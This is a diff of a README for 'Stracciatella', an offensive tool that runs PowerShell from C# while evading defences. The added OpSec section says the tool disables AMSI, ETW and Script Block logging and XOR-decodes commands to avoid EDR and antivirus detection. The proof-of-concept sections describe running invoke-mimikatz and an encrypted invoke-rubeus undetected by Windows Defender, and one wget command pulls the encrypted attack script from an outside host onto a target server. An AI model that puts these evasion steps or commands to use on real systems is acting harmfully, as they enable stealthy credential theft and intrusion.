@@ -8,6 +8,14 @@ PowerShell runspace from within C# (aka SharpPick technique) with AMSI, ETW and 
 
 (SharpPick idea = launch powershell scripts from within C# assembly by the use of Runspaces)
 
+OpSec
+======
+> This program provides functionality to decode passed parameters on the fly, using Xor single-byte decode
+> Before launching any command, it makes sure to disable AMSI using two approaches and ETW
+> Before launching any command, it makes sure to disable Script Block logging using two approaches
+> This program does not patch any system library, system native code (think amsi.dll)
+> Efforts were made to not store decoded script/commands excessively long, in order to protect itself from memory-dumping techniques governed by EDRs and AVs
+
 
 ================================================================================================================================
 PoC 1 - Running 'invoke-mimikatz' with 'Stracciatella' on a Windows 10 laptop without getting detected by Windows Defender
@@ -83,11 +91,11 @@ SID               : S-1-5-21-936125016-2310263949-2175806047-500
 
 ==================================================================================================================================
 PoC 2 - Running an encrypted version of 'invoke-rubeus.ps1' using 'Stracciatella' on a Windows 10 laptop without getting detected
-		    by Windows Defender
+	by Windows Defender
 ==================================================================================================================================
 
 First we encrypt the script 'invoke-rubeus' using the PowerShell crypter script 'XenCrypt.ps1' (https://github.com/the-xentropy/xencrypt)
-Then we download and run it on a target Windows server with 'Stracciatella.exe'.
+Then we download the encrypted script and run it on a target Windows server with 'Stracciatella.exe' (without disabling Windows Defender or the AMSI).
 
 PS C:\temp> wget -URI http://192.168.1.110:8080/Xencrypt-Invoke-Rub3us.ps1 -OutFile C:\temp\Xencrypt-Invoke-Rub3us.ps1
 
